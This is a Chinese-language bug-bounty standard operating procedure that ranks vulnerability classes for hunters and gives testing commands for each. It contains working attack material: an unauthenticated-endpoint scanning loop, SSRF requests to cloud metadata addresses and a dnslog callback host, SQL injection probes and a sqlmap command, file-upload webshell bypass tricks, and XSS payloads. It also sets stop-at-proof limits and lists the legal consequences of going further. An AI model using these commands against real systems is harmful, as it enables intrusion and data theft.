# 漏洞挖掘 SOP

按性价比排序。**从上往下打**，别一上来啃 RCE。

## 优先级 1：未授权访问（出货率最高）

**特征**：接口返回数据但不需要 token。后台页面能直接打开。

**检测**：

```bash
# 批量测：去掉 Cookie 重放请求
# Burp 里用 Autorize 插件自动跑（推荐）

# 手工测常见路径
for p in /api/v1/user/list /api/user/info /admin/user/list \
         /api/order/list /system/user/list /actuator/env \
         /druid/index.html /swagger-ui.html; do
  for host in $(cat targets/$TARGET/subs/interesting.txt | awk '{print $1}'); do
    code=$(curl -s -k -o /tmp/r -w "%{http_code}" -m 8 "https://$host$p")
    size=$(wc -c < /tmp/r)
    [ "$code" = "200" ] && [ "$size" -gt 500 ] && echo "[HIT] $host$p ($size bytes)"
  done
done
```

**判定标准**：返回体里有业务数据（用户列表、订单、配置），不是登录页的 HTML。

**报告要点**：证明「无凭据可读」，截图响应体前 20 行，敏感字段打码。

## 优先级 2：越权 / IDOR

**特征**：URL 里有数字 ID、user_id、order_no 这类参数。

**两个方向**：

- **水平越权**：A 用户能看 B 用户数据。用两个账号，互相换 ID。
- **垂直越权**：普通用户能调管理员接口。

**检测**：

```bash
# 有账号后：登录A，抓请求，把ID换掉
# 原始： GET /api/order/detail?orderId=100001  (A的订单)
# 篡改： GET /api/order/detail?orderId=100002  (B的订单)
# 如果返回B的订单 = 水平越权

# 垂直越权：普通用户 token 打管理员接口
curl -H "Authorization: Bearer <普通用户token>" \
     "https://TARGET/api/admin/user/list"
# 返回 200 + 数据 = 垂直越权
```

**工具**：Burp 的 Autorize 插件，配置低权账号，自动重放所有请求并对比响应。

## 优先级 3：信息泄露

**最容易出，也最容易被判无危害。** 关键是证明敏感性。

| 类型 | 检测 | 是否收 |
|---|---|---|
| .git 泄露 | `curl https://TARGET/.git/config` | 收（可还原源码） |
| .env 泄露 | 含 DB_PASSWORD / AK/SK | 收，高危 |
| Swagger 未授权 | /v2/api-docs 返回 JSON | 收（暴露全接口） |
| 备份文件 | www.zip / db.sql 可下载 | 收，高危 |
| 源码泄露 | .svn / .DS_Store | 中危 |
| 手机号明文接口 | 需证明可批量 | 视情况 |
| 内网 IP 泄露 | 只有 IP 字符串 | 一般不收 |

## 优先级 4：SSRF

**特征**：参数是 URL、图片地址、webhook、导入文件地址。

```bash
# 候选参数名
url= image= img= link= src= target= u= fetch= load= path= redirect=

# 基础验证（用 dnslog 确认有回连）
curl "https://TARGET/api/fetch?url=http://YOUR_DNSLOG_SUB.dnslog.cn"

# 云元数据探测（确认能打内网后）
curl "https://TARGET/api/fetch?url=http://100.100.100.200/latest/meta-data/"     # 阿里云
curl "https://TARGET/api/fetch?url=http://metadata.tencentyun.com/latest/meta-data/"  # 腾讯云
curl "https://TARGET/api/fetch?url=http://169.254.169.254/latest/meta-data/"    # AWS
```

**注意**：只读到元数据目录列表就算漏洞了，**不要再往下拿 AK/SK 去用**。拿到凭据的那一刻性质就变了。

## 优先级 5：SQL 注入

```bash
# 先手工探（报错 / 布尔 / 时间）
curl "https://TARGET/api/items?id=1'"
curl "https://TARGET/api/items?id=1 and 1=1"
curl "https://TARGET/api/items?id=1 and 1=2"

# 确认了再上 sqlmap，只 dump 一个字段证明即可
sqlmap -u "https://TARGET/api/items?id=1" --batch --level=3 --risk=2 \
       --random-agent --technique=BE --current-db
```

**只要证明 current-db 或 version() 就够了**。不要 dump 用户表——那叫拖库，性质变了，而且 100% 会被厂商投诉。

## 优先级 6：文件上传 / RCE

看到上传点就试这套（每一环单独算一个漏洞）：

```
shell.php.jpg
shell.phtml / shell.pht / shell.php5
Content-Type: image/jpeg（伪造）
.htaccess 覆盖（AddType application/x-httpd-php .jpg）
图片马（GIF89a + <?php ...?>）
%00 截断（老版本 PHP）
```

**只传到成功为止，不要执行反弹 shell**。证明「能上传可执行文件」就够交报告了。

## 优先级 7：逻辑漏洞（大厂最爱）

这类不看技术看脑子：

- 支付金额篡改（把 price 改成 0.01）
- 优惠券重复领取 / 叠加使用
- 短信验证码爆破（4 位数字 + 无频次限制）
- 密码找回越权（改手机号就能重置别人的）
- 注册绕过（跳过验证直接登录）
- 无限刷积分 / 抽奖

测的时候**用小额真实支付**（1 分钱），别搞大金额。

## 优先级 8：XSS

单价低但好出，攒 case 用。

```
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
"onmouseover="alert(1)
javascript:alert(1)
```

## 挖洞时绝对不能做的

| 行为 | 后果 |
|---|---|
| 下载用户数据 | 刑事 |
| 删除/修改任何数据 | 刑事 |
| 上 webshell | 刑事 |
| 用拿到的凭据登录别人系统 | 刑事 |
| 打平台范围外的域名 | 违规，账号封禁 |
| 高频扫描导致服务不可用 | 民事赔偿 |

**边界**：证明「能读到」就停手。多想一步就变成罪犯。
